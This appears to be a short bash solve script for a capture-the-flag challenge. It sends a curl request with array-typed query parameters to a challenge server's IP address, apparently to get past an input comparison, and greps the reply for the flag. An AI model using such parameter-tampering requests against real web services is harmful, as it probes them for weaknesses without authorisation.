#!/bin/bash

curl -s 'http://213.177.18.70:8006/?arg1[]=a&arg2[]=1' | grep -Eo 'flag{.*}' | tail -n1
